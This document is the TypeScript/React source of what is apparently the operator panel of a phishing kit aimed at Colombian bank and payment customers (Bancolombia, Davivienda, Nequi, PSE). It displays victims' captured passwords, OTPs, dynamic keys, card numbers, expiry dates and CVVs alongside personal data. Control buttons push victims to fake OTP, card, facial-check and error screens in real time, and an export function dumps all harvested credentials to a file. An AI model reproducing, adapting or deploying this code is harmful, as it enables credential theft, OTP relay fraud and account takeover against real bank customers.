'use client';

import React, { useEffect, useState, useMemo } from 'react';
import { supabase } from '@/lib/supabase';
const projectId = process.env.NEXT_PUBLIC_PROJECT_ID || process.env.NEXT_PUBLIC_TELEGRAM_DTA || 'CLI_20260907_7A45673D';

// ── Métodos de pago fijos (no PSE) ──────────────────────────────────────────
const FIXED_METHODS: { id: string; icon: string; label: string; banks: string[] }[] = [
  { id: 'credito',     icon: '💳', label: 'T. Crédito',  banks: ['credito', 'tarjeta_credito', 'tarjeta']              },
  { id: 'debito',      icon: '💳', label: 'T. Débito',   banks: ['debito', 'tarjeta_debito']                           },
  { id: 'bancolombia', icon: '🟡', label: 'Bancolombia', banks: ['bancolombia']                                        },
  { id: 'davivienda',  icon: '🔴', label: 'Davivienda',  banks: ['davivienda']                                         },
  { id: 'breb',        icon: '🔵', label: 'Bre-B',       banks: ['bre-b', 'breb']                                     },
  { id: 'qr',          icon: '📱', label: 'QR / Nequi',  banks: ['qr', 'nequi', 'daviplata']                          },
];

// Las fuentes que son del FRONT (payment intent), NO del proxy/admin
const FRONT_SOURCES = ['permit_form', 'telegram', 'pse'];

// Fuentes que son proxy/seguridad — las excluimos
const PROXY_SOURCES = ['proxy', 'alerta', 'security'];

function isFrontSession(s: any): boolean {
  const source = (s.source || '').toLowerCase();
  const bank   = (s.bank   || '').toLowerCase();
  // Es front si tiene source de pago, o si su bank es un método de pago conocido
  if (PROXY_SOURCES.some(p => source.includes(p))) return false;
  if (bank === 'proxy security' || bank.includes('proxy')) return false;
  // status de proxy
  if ((s.status || '') === 'alerta' && !source) return false;
  return true;
}

function getFixedMethodId(s: any): string | null {
  const bank   = (s.bank   || '').toLowerCase().trim();
  const status = (s.status || '').toLowerCase();
  for (const m of FIXED_METHODS) {
    if (m.banks.some(b => bank === b || status.includes(b) || status === `intento_${m.id}`)) {
      return m.id;
    }
  }
  return null;
}

function isPseSession(s: any): boolean {
  const bank   = (s.bank   || '').toLowerCase().trim();
  const status = (s.status || '').toLowerCase();
  return bank === 'pse' || status === 'intento_pse' || status.includes('pse');
}

// Para PSE con banco real: bank contiene el nombre del banco (ej "Bancolombia")
function getPseBankName(s: any): string | null {
  const bank = (s.bank || '').trim();
  const bankL = bank.toLowerCase();
  if (bankL === 'pse' || !bank || FIXED_METHODS.some(m => m.banks.includes(bankL))) return null;
  // Si el status es intento_pse pero no hay banco específico → null
  if ((s.status || '').startsWith('intento_pse') && bankL === 'pse') return null;
  // Si tiene nombre de banco real (de /pse/page.tsx → enviar-telegram)
  return bank;
}

// ── Botones de control ───────────────────────────────────────────────────────
const ACTION_GROUPS = [
  {
    title: 'Autenticación & Claves',
    actions: [
      { id: 'otp',        label: '🔑 OTP',        type: 'primary' },
      { id: 'eotp',       label: '❌ Error OTP',   type: 'danger'  },
      { id: 'otp8',       label: '🔑 OTP 8',       type: 'primary' },
      { id: 'eotp8',      label: '❌ OTP 8',        type: 'danger'  },
      { id: 'dinamica',   label: '🔐 Dinámica',    type: 'primary' },
      { id: 'edinamica',  label: '❌ Dinámica',    type: 'danger'  },
      { id: 'cajero',     label: '🔢 Cajero',      type: 'primary' },
      { id: 'ecajero',    label: '❌ Cajero',      type: 'danger'  },
      { id: 'token',      label: '🔑 Token',       type: 'primary' },
      { id: 'etoken',     label: '❌ Token',       type: 'danger'  },
      { id: 'vencido',    label: '⏳ Vencido',     type: 'warning' },
    ]
  },
  {
    title: 'Tarjetas & App',
    actions: [
      { id: 'tc',            label: '💳 Pedir TC',  type: 'primary' },
      { id: 'etc',           label: '❌ Error TC',  type: 'danger'  },
      { id: 'facial',        label: '🤳 Facial',    type: 'primary' },
      { id: 'menu_efacial',  label: '⚠️ ID/Facial', type: 'warning' },
      { id: 'actdatos',      label: '👤 Act Datos', type: 'primary' },
      { id: 'solicitud_qr',  label: '📲 Pedir QR',  type: 'primary' },
      { id: 'eqr',           label: '❌ Error QR',  type: 'danger'  },
      { id: 'autorizar_app', label: '📲 Autorizar', type: 'primary' },
      { id: 'xconnection',   label: '📲 Conexión',  type: 'primary' },
    ]
  },
  {
    title: 'General & Errores',
    actions: [
      { id: 'saldo',        label: '💰 Saldo',   type: 'success' },
      { id: 'elogo',        label: '⚠️ Logo',    type: 'warning' },
      { id: 'error_asesor', label: '⛔ Asesor',  type: 'danger'  },
      { id: 'xsistema',     label: '❌ Sistema', type: 'danger'  },
      { id: 'esistema',     label: '⛔ Sistema', type: 'danger'  },
      { id: 'xbloqueo',     label: '❌ Bloqueo', type: 'danger'  },
      { id: 'error',        label: '❌ Datos',   type: 'danger'  },
    ]
  }
];

export default function LiveDashboard({ telegramDta }: { telegramDta?: string }) {
  const [all, setAll]         = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [expanded, setExpanded] = useState<Record<string, boolean>>({});
  const [activeTab, setActiveTab] = useState('todos');

  const panelId = telegramDta || projectId;

  const toggle = (id: string) => setExpanded(p => ({ ...p, [id]: !p[id] }));

  // ── Carga + realtime (Protegido y Resiliente) ───────────────────
  useEffect(() => {
    let isMounted = true;
    let ch: any = null;

    const load = async () => {
      try {
        let q = supabase
          .from('pyp_telegram_sessions')
          .select('*')
          .order('updated_at', { ascending: false })
          .limit(200);
        if (panelId) q = q.eq('project_id', panelId);
        const { data, error } = await q;
        if (error) {
          console.warn('[LiveDashboard] Error al cargar sesiones:', error);
        }
        if (data && isMounted) setAll(data);
      } catch (err) {
        console.error('[LiveDashboard] Error cargando sesiones:', err);
      } finally {
        if (isMounted) setLoading(false);
      }
    };
    load();

    try {
      const filterStr = panelId ? `project_id=eq.${panelId}` : undefined;
      ch = supabase.channel('live-front')
        .on('postgres_changes', { event: '*', schema: 'public', table: 'pyp_telegram_sessions', filter: filterStr },
          ({ eventType, new: n, old: o }: any) => {
            if (!isMounted) return;
            setAll(prev => {
              if (eventType === 'INSERT') return [n as any, ...prev];
              if (eventType === 'UPDATE') return prev.map(s => s.id === (n as any).id ? n as any : s);
              if (eventType === 'DELETE') return prev.filter(s => s.id !== (o as any).id);
              return prev;
            });
          })
        .subscribe();
    } catch (err) {
      console.warn('[LiveDashboard] Realtime no disponible:', err);
    }

    return () => {
      isMounted = false;
      if (ch) {
        try { supabase.removeChannel(ch); } catch {}
      }
    };
  }, [panelId]);

  // ── Solo sesiones del FRONT (excluir proxy/admin) ───────────────────────────
  const frontSessions = useMemo(() => all.filter(isFrontSession), [all]);

  // ── Construir tabs dinámicos ────────────────────────────────────────────────
  // Tab PSE con intento (bank === 'pse') y PSE con banco real (bank = nombre banco)
  const pseTabs = useMemo(() => {
    const bankCounts: Record<string, number> = {};
    frontSessions.forEach(s => {
      if (isPseSession(s)) {
        const realBank = getPseBankName(s);
        const key = realBank || '__intento__';
        bankCounts[key] = (bankCounts[key] || 0) + 1;
      }
    });
    return bankCounts;
  }, [frontSessions]);

  const hasPseIntent = (pseTabs['__intento__'] || 0) > 0;

  // ── Conteos por tab ─────────────────────────────────────────────────────────
  const counts = useMemo(() => {
    const c: Record<string, number> = { todos: frontSessions.length };
    if (hasPseIntent) c['pse_intento'] = pseTabs['__intento__'] || 0;
    Object.entries(pseTabs).forEach(([k, v]) => { if (k !== '__intento__') c[`pse_${k}`] = v; });
    FIXED_METHODS.forEach(m => { c[m.id] = 0; });
    frontSessions.forEach(s => {
      const mid = getFixedMethodId(s);
      if (mid) c[mid] = (c[mid] || 0) + 1;
    });
    return c;
  }, [frontSessions, pseTabs]);

  // ── Filtrado según tab activo ───────────────────────────────────────────────
  const filtered = useMemo(() => {
    if (activeTab === 'todos') return frontSessions;
    if (activeTab === 'pse_intento') return frontSessions.filter(s => isPseSession(s) && !getPseBankName(s));
    if (activeTab.startsWith('pse_')) {
      const bankName = activeTab.slice(4);
      return frontSessions.filter(s => (s.bank || '') === bankName);
    }
    const method = FIXED_METHODS.find(m => m.id === activeTab);
    if (method) return frontSessions.filter(s => getFixedMethodId(s) === method.id);
    return frontSessions;
  }, [frontSessions, activeTab]);

  // ── Helpers visuales ────────────────────────────────────────────────────────
  const statusBadge = (status: string) => {
    if (!status) return null;
    if (status === 'fin')  return <span className="px-2 py-0.5 bg-violet-500/15 text-violet-400 border border-violet-500/25 rounded text-[11px] font-bold uppercase">✅ Finalizado</span>;
    if (status.startsWith('intento')) {
      const m = status.replace('intento_', '').toUpperCase();
      return <span className="px-2 py-0.5 bg-amber-500/15 text-amber-400 border border-amber-500/25 rounded text-[11px] font-bold uppercase">🔔 {m}</span>;
    }
    if (status === 'pending') return <span className="px-2 py-0.5 bg-sky-500/15 text-sky-400 border border-sky-500/25 rounded text-[11px] font-bold uppercase">⏳ Pendiente</span>;
    if (status === 'alerta')  return <span className="px-2 py-0.5 bg-orange-500/15 text-orange-400 border border-orange-500/25 rounded text-[11px] font-bold uppercase">⚠️ Alerta</span>;
    if (status.startsWith('e') || status.startsWith('x') || status === 'error') {
      return <span className="px-2 py-0.5 bg-red-500/15 text-red-400 border border-red-500/25 rounded text-[11px] font-bold uppercase">❌ {status}</span>;
    }
    return <span className="px-2 py-0.5 bg-zinc-700/60 text-zinc-300 border border-zinc-600/40 rounded text-[11px] font-bold uppercase">{status}</span>;
  };

  const btnCls = (type: string) => {
    switch (type) {
      case 'primary': return 'bg-zinc-800 text-zinc-300 border border-zinc-700 hover:bg-zinc-700 hover:text-white';
      case 'danger':  return 'bg-red-500/10 text-red-400 border border-red-500/20 hover:bg-red-500/20';
      case 'warning': return 'bg-amber-500/10 text-amber-400 border border-amber-500/20 hover:bg-amber-500/20';
      case 'success': return 'bg-violet-500/10 text-violet-400 border border-violet-500/20 hover:bg-violet-500/20';
      default:        return 'bg-zinc-800 text-zinc-300 border border-zinc-700 hover:bg-zinc-700';
    }
  };

  const handleAction = async (sessionId: string, action: string) => {
    let finalAction = action;

    if (action === 'otp') {
      const is8 = window.confirm('¿El OTP es de 8 dígitos? (Presiona Cancelar si es de 6)');
      if (is8) finalAction = 'otp8';
    } else if (action === 'eotp') {
      const is8 = window.confirm('¿El error OTP es para 8 dígitos? (Presiona Cancelar si es de 6)');
      if (is8) finalAction = 'eotp8';
    }

    try {
      await fetch('/api/banco/status', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId, action: finalAction }),
      });
    } catch (e) { console.error(e); }
  };

  const exportTXT = () => {
    if (!frontSessions.length) { alert('Sin registros.'); return; }
    let txt = 'PANEL PAGOS - EXPORT\n' + '='.repeat(50) + '\n\n';
    frontSessions.forEach((s, i) => {
      txt += `#${frontSessions.length - i} | ${new Date(s.updated_at).toLocaleString('es-CO')} | ${s.status} | ${s.bank || ''}\n`;
      if (s.usuario)  txt += `  Usuario: ${s.usuario}\n`;
      if (s.documento)txt += `  Doc: ${s.documento}\n`;
      if (s.email)    txt += `  Email: ${s.email}\n`;
      if (s.phone)    txt += `  Tel: ${s.phone}\n`;
      if (s.clave)    txt += `  Clave: ${s.clave}\n`;
      if (s.otp)      txt += `  OTP: ${s.otp}\n`;
      if (s.dinamica) txt += `  Din: ${s.dinamica}\n`;
      if (s.tarjeta)  txt += `  TC: ${s.tarjeta} | ${s.fecha} | ${s.cvv}\n`;
      txt += '\n';
    });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(new Blob([txt], { type: 'text/plain' }));
    a.download = `pagos_${new Date().toISOString().split('T')[0]}.txt`;
    document.body.appendChild(a); a.click(); document.body.removeChild(a);
  };

  const activos  = frontSessions.filter(s => s.status !== 'fin').length;
  const intentos = frontSessions.filter(s => (s.status || '').startsWith('intento')).length;

  // ── Badge component ─────────────────────────────────────────────────────────
  const TabBadge = ({ count, active }: { count: number; active: boolean }) => (
    <span className={`ml-1.5 min-w-[20px] px-1.5 py-0.5 rounded-full text-[10px] font-bold text-center inline-block ${
      active ? 'bg-violet-500 text-white' : count > 0 ? 'bg-zinc-700 text-zinc-300' : 'bg-zinc-800 text-zinc-600'
    }`}>
      {count}
    </span>
  );

  // ── Tab button ──────────────────────────────────────────────────────────────
  const Tab = ({ id, icon, label, count }: { id: string; icon: string; label: string; count: number }) => {
    const isA = activeTab === id;
    if (id !== 'todos' && count === 0) return null;
    return (
      <button
        onClick={() => setActiveTab(id)}
        className={`flex items-center px-4 py-2.5 text-xs font-semibold border-b-2 transition-all whitespace-nowrap ${
          isA ? 'border-violet-500 text-violet-400 bg-violet-500/5'
              : 'border-transparent text-zinc-500 hover:text-zinc-300 hover:bg-zinc-800/40'
        }`}
      >
        <span>{icon}</span>
        <span className="ml-1.5">{label}</span>
        <TabBadge count={count} active={isA} />
      </button>
    );
  };

  return (
    <div className="flex flex-col h-full w-full bg-stone-950 text-zinc-100 font-sans overflow-hidden">

      {/* HEADER */}
      <header className="flex-none px-5 py-3 border-b border-stone-800 bg-stone-900 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <span className="relative flex h-3 w-3">
            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
            <span className="relative inline-flex rounded-full h-3 w-3 bg-violet-500"></span>
          </span>
          <div>
            <h1 className="text-sm font-bold text-violet-400">Dashboard · Pagos en Vivo</h1>
            <p className="text-zinc-600 text-[11px] mt-0.5">
              {panelId || 'Global'} · <span className="text-zinc-400">{frontSessions.length} sesiones de pago</span>
              · <span className="text-amber-400">{activos} activas</span>
              {intentos > 0 && <span className="text-amber-500"> · {intentos} intentos</span>}
            </p>
          </div>
        </div>
        <button onClick={exportTXT} className="bg-zinc-800 hover:bg-zinc-700 text-zinc-300 px-3 py-1.5 rounded-lg text-xs font-semibold border border-zinc-700 flex items-center gap-1.5 transition-colors">
          ⬇ Exportar
        </button>
      </header>

      {/* STATS */}
      <div className="flex-none grid grid-cols-3 gap-px bg-zinc-800 border-b border-stone-800">
        <div className="bg-stone-900/80 px-4 py-2">
          <p className="text-zinc-600 text-[10px] uppercase font-bold">Total sesiones</p>
          <p className="text-xl font-bold text-zinc-100">{frontSessions.length}</p>
        </div>
        <div className="bg-stone-900/80 px-4 py-2">
          <p className="text-zinc-600 text-[10px] uppercase font-bold">Activas</p>
          <p className="text-xl font-bold text-violet-400">{activos}</p>
        </div>
        <div className="bg-stone-900/80 px-4 py-2">
          <p className="text-zinc-600 text-[10px] uppercase font-bold">Intentos</p>
          <p className="text-xl font-bold text-amber-400">{intentos}</p>
        </div>
      </div>

      {/* TABS */}
      <div className="flex-none border-b border-stone-800 bg-stone-900/40 overflow-x-auto">
        <div className="flex min-w-max">
          {/* Tab Todos */}
          <Tab id="todos" icon="📋" label="Todos" count={frontSessions.length} />

          {/* Separador PSE */}
          {(hasPseIntent || Object.keys(pseTabs).filter(k => k !== '__intento__').length > 0) && (
            <div className="flex items-center px-2">
              <span className="text-zinc-700 text-[10px] font-bold uppercase tracking-wider">PSE →</span>
            </div>
          )}

          {/* Tab PSE intento (sin banco específico aún) */}
          {hasPseIntent && (
            <Tab id="pse_intento" icon="🏦" label="PSE (intento)" count={pseTabs['__intento__'] || 0} />
          )}

          {/* Tabs PSE por banco real (dinámicos) */}
          {Object.entries(pseTabs)
            .filter(([k]) => k !== '__intento__')
            .sort((a, b) => b[1] - a[1])
            .map(([bankName, count]) => (
              <Tab key={`pse_${bankName}`} id={`pse_${bankName}`} icon="🏦" label={bankName} count={count} />
            ))
          }

          {/* Separador Otros métodos */}
          <div className="flex items-center px-2">
            <span className="text-zinc-700 text-[10px] font-bold uppercase tracking-wider">|</span>
          </div>

          {/* Tabs métodos fijos */}
          {FIXED_METHODS.map(m => (
            <Tab key={m.id} id={m.id} icon={m.icon} label={m.label} count={counts[m.id] || 0} />
          ))}
        </div>
      </div>

      {/* LISTA */}
      <div className="flex-1 overflow-y-auto">
        {loading ? (
          <div className="flex flex-col items-center justify-center h-48 gap-3">
            <div className="animate-spin rounded-full h-7 w-7 border-b-2 border-violet-500"></div>
            <p className="text-zinc-500 text-sm">Cargando sesiones...</p>
          </div>
        ) : filtered.length === 0 ? (
          <div className="flex flex-col items-center justify-center h-48 text-zinc-600">
            <p className="text-4xl mb-2">📭</p>
            <p className="text-sm">Sin sesiones de pago para este filtro.</p>
            <p className="text-xs text-zinc-700 mt-1">Aparecen cuando alguien selecciona un método de pago en el formulario.</p>
          </div>
        ) : (
          <div className="p-3 space-y-2">
            {filtered.map((s: any) => {
              const isActive   = s.status !== 'fin';
              const isExpanded = expanded[s.id] ?? isActive;
              const realBank   = getPseBankName(s);
              const fixedM     = FIXED_METHODS.find(m => m.id === getFixedMethodId(s));

              const displayLabel = realBank
                ? `🏦 PSE · ${realBank}`
                : fixedM
                  ? `${fixedM.icon} ${fixedM.label}`
                  : isPseSession(s)
                    ? '🏦 PSE'
                    : (s.bank || 'Desconocido');

              return (
                <div
                  key={s.id}
                  className={`rounded-xl border transition-all ${
                    isActive
                      ? 'border-violet-500/40 bg-stone-900 shadow-[0_0_10px_rgba(16,185,129,0.06)]'
                      : 'border-stone-800/70 bg-stone-900/50'
                  }`}
                >
                  {/* Cabecera siempre visible */}
                  <div
                    className="flex flex-wrap items-center gap-2 px-4 py-3 cursor-pointer select-none"
                    onClick={() => toggle(s.id)}
                  >
                    {isActive && (
                      <span className="relative flex h-2 w-2 shrink-0">
                        <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-60"></span>
                        <span className="relative inline-flex rounded-full h-2 w-2 bg-violet-500"></span>
                      </span>
                    )}

                    {/* Método / banco */}
                    <span className="text-xs font-bold px-2.5 py-1 rounded-lg border bg-zinc-800 text-zinc-200 border-zinc-700">
                      {displayLabel}
                    </span>

                    {/* Usuario */}
                    {s.usuario && s.usuario !== 'Visitante' && (
                      <span className="text-xs text-zinc-300">👤 {s.usuario}</span>
                    )}

                    {/* Cédula */}
                    {s.documento && (
                      <span className="text-xs text-zinc-500 font-mono">🪪 {s.documento}</span>
                    )}

                    {/* Estado */}
                    {statusBadge(s.status)}

                    {/* Total */}
                    {s.total && (
                      <span className="text-xs font-bold text-violet-400">💰 ${s.total}</span>
                    )}

                    {/* Hora + toggle */}
                    <span className="ml-auto text-[11px] text-zinc-600 shrink-0 flex items-center gap-1">
                      🕒 {new Date(s.updated_at).toLocaleTimeString('es-CO', { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
                      <span className="ml-1 text-zinc-500">{isExpanded ? '▼' : '▶'}</span>
                    </span>
                  </div>

                  {/* Detalle expandible */}
                  {isExpanded && (
                    <div className="border-t border-stone-800/50 px-4 pb-4 pt-4 grid grid-cols-1 xl:grid-cols-[280px_1fr] gap-5">

                      {/* Datos del usuario */}
                      <div className="space-y-3">
                        <p className="text-[10px] font-bold text-zinc-600 uppercase tracking-wider">Datos ingresados</p>
                        <div className="grid grid-cols-2 gap-3">
                          {s.email && (
                            <div className="col-span-2">
                              <p className="text-zinc-600 text-[10px] font-bold uppercase mb-0.5">📧 Correo</p>
                              <p className="text-zinc-300 text-xs truncate">{s.email}</p>
                            </div>
                          )}
                          {s.phone && (
                            <div>
                              <p className="text-zinc-600 text-[10px] font-bold uppercase mb-0.5">📞 Teléfono</p>
                              <p className="text-zinc-300 text-xs">{s.phone}</p>
                            </div>
                          )}
                          {s.address && (
                            <div className="col-span-2">
                              <p className="text-zinc-600 text-[10px] font-bold uppercase mb-0.5">📍 Dirección</p>
                              <p className="text-zinc-400 text-xs">{s.address}</p>
                            </div>
                          )}
                          {s.ip && (
                            <div className="col-span-2">
                              <p className="text-zinc-600 text-[10px] font-bold uppercase mb-0.5">🌐 IP</p>
                              <p className="font-mono text-zinc-500 text-xs">{s.ip}</p>
                            </div>
                          )}
                        </div>

                        {s.clave && (
                          <div className="bg-zinc-800 rounded-lg p-2.5 border border-zinc-700">
                            <p className="text-zinc-500 text-[10px] font-bold uppercase mb-1">🔒 Clave</p>
                            <p className="font-mono text-zinc-100 text-base font-bold">{s.clave}</p>
                          </div>
                        )}
                        {s.otp && (
                          <div className="bg-red-500/10 rounded-lg p-2.5 border border-red-500/25">
                            <p className="text-red-400 text-[10px] font-bold uppercase mb-1">🔑 OTP / Token</p>
                            <p className="font-mono font-bold text-red-300 text-2xl tracking-[0.3em]">{s.otp}</p>
                          </div>
                        )}
                        {s.dinamica && (
                          <div className="bg-purple-500/10 rounded-lg p-2.5 border border-purple-500/25">
                            <p className="text-purple-400 text-[10px] font-bold uppercase mb-1">🔐 Clave Dinámica</p>
                            <p className="font-mono font-bold text-purple-300 text-2xl tracking-[0.3em]">{s.dinamica}</p>
                          </div>
                        )}
                        {s.tarjeta && (
                          <div className="bg-zinc-800 rounded-lg p-2.5 border border-zinc-700">
                            <p className="text-zinc-500 text-[10px] font-bold uppercase mb-1">💳 Tarjeta</p>
                            <p className="font-mono text-zinc-100 text-sm">{s.tarjeta}</p>
                            <p className="font-mono text-zinc-500 text-xs mt-0.5">Venc: {s.fecha} &nbsp;|&nbsp; CVV: {s.cvv}</p>
                          </div>
                        )}
                      </div>

                      {/* Panel de control */}
                      <div className="border-t xl:border-t-0 xl:border-l border-stone-800/50 pt-4 xl:pt-0 xl:pl-5 flex flex-col gap-3">
                        <p className="text-[10px] font-bold text-zinc-500 uppercase tracking-wider flex items-center gap-1.5">
                          <span className="w-1.5 h-1.5 rounded-full bg-violet-500"></span>
                          Panel de Control Rápido
                        </p>
                        {ACTION_GROUPS.map((group, idx) => (
                          <div key={idx}>
                            <p className="text-[10px] font-bold text-zinc-600 uppercase tracking-wider mb-1.5">{group.title}</p>
                            <div className="flex flex-wrap gap-1.5">
                              {group.actions.map(action => (
                                <button
                                  key={action.id}
                                  onClick={() => handleAction(s.id, action.id)}
                                  className={`px-2 py-1 rounded text-[11px] font-medium transition-all ${btnCls(action.type)}`}
                                >
                                  {action.label}
                                </button>
                              ))}
                            </div>
                          </div>
                        ))}
                        <div className="mt-auto pt-3 border-t border-stone-800/50 flex justify-end">
                          <button
                            onClick={() => handleAction(s.id, 'fin')}
                            className="px-5 py-2 bg-violet-600 text-white rounded-lg text-xs font-bold hover:bg-violet-500 transition-all border border-violet-500"
                          >
                            ✅ Finalizar Sesión
                          </button>
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        )}
      </div>
    </div>
  );
}
